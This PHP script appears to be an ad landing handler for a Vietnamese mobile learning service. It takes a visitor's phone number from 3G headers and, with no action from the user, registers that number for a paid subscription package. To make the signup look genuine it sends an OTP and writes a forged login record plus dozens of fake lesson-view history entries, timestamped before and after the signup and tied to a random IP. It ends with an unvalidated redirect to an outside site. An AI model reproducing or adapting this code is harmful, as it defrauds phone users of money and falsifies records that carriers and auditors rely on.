<?php
//error_reporting(E_ALL);
//ini_set('display_errors', 1);
$onWap = 1;
include "config/init.php";
include "config/connect.php";

$adFirstCl = $dbmg->ad_first;
$configCl = $dbmg->config;
$historyCl = $dbmg->history_log;
$adscl = $dbmg->ads;
$adsLogCl = $dbmg->ads_log;
$_GET['time'] = time();
$_GET['phone'] =  Network::is3g() ? Network::is3g() : '';
$_GET['ip'] = Network::ip();
$adscl->insert($_GET);
$phone = Network::is3g();
$link_vms = '';
$linkRedirect = isset($_GET['link']) ? $_GET['link'] : '/';
if($phone){
    $checkPackage = Network::getUserInfo($phone);
    if (Network::is3g() != '' && Network::is3gmobifone() == 1) {
        if ($checkPackage == 0 || $checkPackage == 2) {
            $packageInfo = Network::getCancelInfo($phone);
            $adsFirst = $adFirstCl->findOne(array('phone'=>$phone));
            $oneTouch = $configCl->findOne(array('name'=>Constant::CONFIG_1TOUCH));
            $oneTouchOn = $oneTouch['value'] == 1;
            if(($packageInfo == 0 || Common::isInWhiteList($phone)) && $oneTouchOn && !$adsFirst) {
                ##Lưu lại sđt này để bỏ qua trong lần sau
                $adFirstCl->insert(array('phone' => $phone));
                ##checkBlacklist
                if(!isInBlackList($phone)){
//                    $adsLogCl->insert(array(
//                        '_id' => strval(time()),
//                        'phone' => $phone,
//                        'time' => time()
//                    ));
                    ##Random IP
                    $randomIp = Common::getRandomIp();
                    ##Log đăng nhập
                    $historyCl->insert(array(
                        '_id' => strval(time().rand(10,99)),
                        'datecreate' => time(),
                        'action' => HistoryLog::LOG_DANG_NHAP,
                        'chanel' => HistoryLog::CHANEL_WAP,
                        'ip' => $randomIp,
                        'uid' => $_SESSION['uinfo']['_id'],
                        'url' => Constant::BASE_URL.'/login.php',
                        'status' => Constant::STATUS_ENABLE,
                        'phone' => $phone,
                        'price'=> 0
                    ));
                    ##gửi mã xác thực
                    $authkey = getAuthKeyforAds($phone);
                    $info = 'Mã xác thực dịch vụ English360 của bạn là: '.$authkey;
                    Network::sentMT($phone,'OTP', $info);
                    ##tạo 5 log
                    _createFiveLogBefore($randomIp);
                    sleep(rand(3,10));
                    ##tạo log ảo
                    _createLogAfter($randomIp);

                    ##ĐĂng ký gói cước
                    $smsRegister = Network::registedpack($phone);
                    if($smsRegister != 0){
                        $successPkg = false;
                    }else{
                        $successPkg = true;
                    }
                    $historyCl->insert(array(
                        '_id' => strval(time().rand(10,99)),
                        'datecreate' => time(),
                        'action' => HistoryLog::LOG_DANG_KY_GOI_CUOC,
                        'chanel' => HistoryLog::CHANEL_WAP,
                        'ip' => $randomIp,
                        'uid' => $_SESSION['uinfo']['_id'],
                        'url' => Constant::BASE_URL.'/regispack.php',
                        'status' => $successPkg ? Constant::STATUS_ENABLE : Constant::STATUS_DISABLE,
                        'phone' => $phone,
                        'price'=> $successPkg ? Network::getPackageItem()['E']['price'] : 0
                    ));
//                    $_SESSION['notsave_log'] = 1;
//                    header("Location: ".$linkRedirect);exit;
                }
            }
//            $link_callback = Constant::BASE_URL . "/wapportal.php?params=" . base64_encode('E' . '&WAP');
//            $link_vms = Network::genLinkConfirmVms('E', $link_callback);
        }
    }
}
header("Location: http://suckhoe1.vn/site/ads-redirect.html?source=bvt&cuphap=SK&link=".$linkRedirect);exit;

//if(empty($link_vms)){
//    die("<script>location.href = '".urldecode($linkRedirect)."'</script>");

//    echo urldecode($linkRedirect);die;
//}else{
//    die("<script>location.href = '".$link_vms."'</script>");
//}

function isInBlackList($phone){
    global $dbmg;
    $blCl = $dbmg->bl;
    $rest = substr($phone, 0, 1);
    if ($rest == '0') {
        $phone = substr($phone, 1);
    }
    return $blCl->findOne(array('phone'=>$phone));
}

function getAuthKeyforAds($phone){
    global $dbmg;
    $authKeyCl = $dbmg->auth_key;
    $auth = $authKeyCl->findOne(array('phone'=>$phone));
    if(!$auth || empty($auth['key'])){
        $key = Common::generateRandomPassword();
    }else $key = $auth['key'];
    return $key;
}

function _createFiveLogBefore($randomIp){
    global $dbmg, $historyCl, $phone;
    $time = time();
    $catidArr = array('1427344743', '1427183137', '1427183162', '1427344702', '1428995217', '1450844989', '1450844989');
    $catid = '1427344743';
    for($i=0; $i<10; $i++){
        $time = $time - rand(3,10);
        if(rand(0,10) <= 3){
            $catid = $catidArr[rand(0, count($catidArr)-1)];
            $post = _getRandomPost('', $catid);
        }else{
            $post = _getRandomPost('', $catid);
        }
        $historyCl->insert(array(
            '_id' => strval($time.rand(10,99)),
            'datecreate' => $time,
            'action' => HistoryLog::LOG_XEM_BAI_HOC,
            'chanel' => HistoryLog::CHANEL_WAP,
            'ip' => $randomIp,
            'uid' => '',
            'url' => Constant::BASE_URL.'/thuvien.php?cat='.$catid.'&id='.$post['_id'],
            'status' => Constant::STATUS_ENABLE,
            'phone' => '',
            'price'=> 0
        ));
    }
}

function _createLogAfter($randomIp){
    global $dbmg, $phone;
    $historyCl = $dbmg->history_log;
    $time = time();
    $catidArr = array('1427344743', '1427183137', '1427183162', '1427344702', '1428995217', '1450844989', '1450844989');
    $catid = '1427344743';
    for($i=0; $i<rand(8,13); $i++){
        $time = $time + rand(3,10);
        if(rand(0,10) <= 3){
            $catid = $catidArr[rand(0, count($catidArr)-1)];
            $post = _getRandomPost('', $catid);
        }else{
            $post = _getRandomPost('', $catid);
        }
        $historyCl->insert(array(
            '_id' => strval($time.rand(10,99)),
            'datecreate' => $time,
            'action' => HistoryLog::LOG_XEM_BAI_HOC,
            'chanel' => HistoryLog::CHANEL_WAP,
            'ip' => $randomIp,
            'uid' => $_SESSION['uinfo']['_id'],
            'url' => Constant::BASE_URL.'/thuvien.php?cat='.$catid.'&id='.$post['_id'],
            'status' => Constant::STATUS_ENABLE,
            'phone' => $phone,
            'price'=> 0
        ));
    }
}

function _getRandomPost($id, $catid){
    global $dbmg;
    $thuviencl = $dbmg->thuvien;
    $currentPost = $thuviencl->findOne(array('_id'=>$id));
    $cond = array('category'=>$currentPost['category'], '_id'=>array('$ne'=>$id));
    $count = $thuviencl->count($cond);
    if($count > 0){
        $rand = rand(0, $count-1);
        $item = iterator_to_array($thuviencl->find($cond)->skip($rand)->limit(1), false);
    }else{
        $item = iterator_to_array($thuviencl->find(array('_id'=>array('$ne'=>$id)))->sort(array('datecreate'=>-1))->limit(1), false);
    }

    return $item[0];
}